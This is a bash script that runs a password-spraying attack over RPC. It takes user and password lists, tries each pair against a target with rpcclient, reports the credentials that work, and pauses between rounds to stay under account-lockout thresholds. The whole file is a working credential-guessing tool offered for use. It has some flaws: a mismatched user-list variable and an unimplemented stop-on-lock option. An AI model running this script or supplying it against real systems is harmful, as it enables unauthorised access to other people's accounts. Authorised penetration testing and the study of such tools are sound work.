#!/bin/bash
#
declare -a found=()

STOPONFAIL=false
LOCKOUTPERIOD=0
LOCKOUTATTEMPTS=1
DOMAIN="WORKGROUP"

while [[ $# -gt 0 ]]; do
        case $1 in
                -t|--target)
                        TARGET="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -u|--username)
                        USERNAME="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -U|--userList)
                        USERSLIST="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -p|--password)
                        PASSWORD="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -P|--passwordList)
                        PASSWORDLIST="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -a|--attemptsPerLockoutPeriod)
                        LOCKOUTATTEMPTS="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -l|--lockoutPeriodInMinutes)
                        LOCKOUTPERIOD="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -d|--domain)
                        DOMAIN="$2"
                        shift # past argument
                        shift # past value
                        ;;
                -s|--stoponlock)
                        STOPONLOCK=true
                        shift # past argument
                        shift # past value
                        ;;
                -h|--help)
                        echo "This script will use rpc to connect and do a password spray. You can define a single user, password or multiple users or passwords."
                        echo "The following is required: -t -u/-U -p/-P"
                        echo "-t/--target is the current target to attack"
                        echo "-u/--username is the username or you wish to spray"
                        echo "-U/--userList is the list of usernames you wish to spray"
                        echo "-p/--password is the password you wish to spray"
                        echo "-P/--passwordList is the list of passwords you wish to spray"
                        echo "-a/--attemptsPerLockoutPeriod is the amount of attempts the script will spray before wating the lockout time. Default set to 0!"
                        echo "-l/--lockoutPeriodInMinutes is the amount of minutes the script will wait between each spray campagin. Default set to 0!"
                        echo "-s/--stoponlock is the bolean value to stop on account lockout. Only flag needs to be set, no value needed!WARNING NOT IMPLEMENTED YET, WILL GET TO THIS"
                        exit 1
                        ;;
                -*|--*)
                echo "Unknown option $1"
                exit 1
                ;;
                *)
                POSITIONAL_ARGS+=("$1") # save positional arg
                shift # past argument
                ;;
        esac
done

if [ ! -z "$USERNAME"  ]
then
        USERS=$USERNAME
elif [ ! -z "$USERLIST"  ]
then
        USERS=$(cat $USERLIST)
fi

if [ ! -z "$PASSWORD"  ]
then
        PASSWDS=$PASSWORD
elif [ ! -z "$PASSWORDLIST"  ]
then
        PASSWDS=$(cat $PASSWORDLIST)
fi

i=$LOCKOUTATTEMPTS
for pass in $PASSWDS
do
        if [[ $i != 0 ]]
        then
                echo "[*] Trying $pass as password"
                for user in $USERS
                do

                        if [[ ${found[@]} != $user ]]
                        then
                                res=$(rpcclient -U "$DOMAIN\\$user%$pass" -c "getusername;quit" $TARGET 2>&1 |grep -v "NT_STATUS_LOGON_FAILURE" |tr -d '\n')
                                if [[ $res == *"Authority"* ]]
                                then
                                        echo "[+] Found $user:$pass"
                                        found+=("$user")
                                fi
                        fi

                done
                ((i--))
        else
                sleep $((${LOCKOUTPERIOD}*60))
                i=$LOCKOUTATTEMPTS
        fi
done
